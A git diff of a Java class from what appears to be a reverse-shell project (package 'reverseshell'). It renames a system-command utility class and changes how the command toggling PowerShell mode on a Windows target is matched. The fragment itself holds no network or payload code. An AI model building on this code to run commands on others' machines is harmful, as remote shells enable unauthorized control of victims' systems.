@@ -1,13 +1,12 @@
 package com.mtattab.reverseshell.service.commands;
 
-import com.mtattab.reverseshell.model.CommandRestOutput;
 import com.mtattab.reverseshell.service.Command;
-import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
+import com.mtattab.reverseshell.util.SystemCommandUtil;
 
 public class TogglePowerShellCommand implements Command {
     @Override
     public String executeCommand(String command) {
-        if (SystemCommandProxyUtil.isWindows && togglePowerShell(command) != null) {
+        if (SystemCommandUtil.isWindows && togglePowerShell(command) != null) {
             return "Switched to powershell successfuly" ;
 
 
@@ -16,8 +15,9 @@ public class TogglePowerShellCommand implements Command {
     }
 
     private static String togglePowerShell(String commands){
-        if (commands.toLowerCase().contains("powershell")){
-            SystemCommandProxyUtil.runPowerShell= !SystemCommandProxyUtil.runPowerShell;
+
+        if (commands.equalsIgnoreCase("powershell") ){
+            SystemCommandUtil.runPowerShell= !SystemCommandUtil.runPowerShell;
             return "Switched to Powershell mode";
 
         }
